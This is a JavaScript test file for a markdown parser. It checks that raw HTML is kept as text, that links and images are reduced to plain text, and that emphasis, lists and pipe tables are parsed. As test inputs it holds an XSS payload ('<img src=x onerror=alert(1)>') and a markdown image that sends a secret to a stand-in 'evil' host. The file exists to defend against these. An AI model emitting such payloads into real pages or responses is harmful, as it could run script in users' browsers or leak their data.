import assert from "node:assert/strict";
import { test } from "node:test";
import { blocks } from "../ui/markdown.js";

test("keeps raw HTML as text", () => {
  assert.deepEqual(blocks("<img src=x onerror=alert(1)>"), [{ type: "p", spans: [{ text: "<img src=x onerror=alert(1)>" }] }]);
});

test("reads bold, italics, and lists", () => {
  assert.deepEqual(blocks("**a** b\n\n- c\n- *d*"), [
    { type: "p", spans: [{ text: "a", bold: true }, { text: " b" }] },
    { type: "ul", items: [[{ text: "c" }], [{ text: "d", italic: true }]] },
  ]);
});

test("drops image and link syntax to plain text", () => {
  assert.deepEqual(blocks("![x](http://evil/?q=secret)"), [{ type: "p", spans: [{ text: "x" }] }]);
});

test("unclosed emphasis stays literal", () => {
  assert.deepEqual(blocks("**unclosed bold"), [{ type: "p", spans: [{ text: "**unclosed bold" }] }]);
  assert.deepEqual(blocks("*note: keep this"), [{ type: "p", spans: [{ text: "*note: keep this" }] }]);
  assert.deepEqual(blocks("ok **a** then *b"), [{ type: "p", spans: [{ text: "ok " }, { text: "a", bold: true }, { text: " then *b" }] }]);
});

test("reads a pipe table, with or without a blank line before it", () => {
  const want = { type: "table", columns: [[{ text: "Card" }], [{ text: "Mood" }]], rows: [[[{ text: "Brakka" }], [{ text: "tense", bold: true }]]] };
  assert.deepEqual(blocks("| Card | Mood |\n|---|:---:|\n| Brakka | **tense** |"), [want]);
  assert.deepEqual(blocks("Two picks:\n| Card | Mood |\n| --- | --- |\n| Brakka | **tense** |"), [{ type: "p", spans: [{ text: "Two picks:" }] }, want]);
});

test("a table cell keeps HTML as text and drops links", () => {
  assert.deepEqual(blocks("| a |\n|---|\n| <b>x</b> [y](http://evil) |")[0].rows, [[[{ text: "<b>x</b> y" }]]]);
});

test("a short row is padded, and pipes without a rule stay text", () => {
  assert.deepEqual(blocks("| a | b |\n|---|---|\n| 1 |")[0].rows, [[[{ text: "1" }], []]]);
  assert.deepEqual(blocks("| a | b |\n| 1 | 2 |"), [{ type: "p", spans: [{ text: "| a | b |\n| 1 | 2 |" }] }]);
});
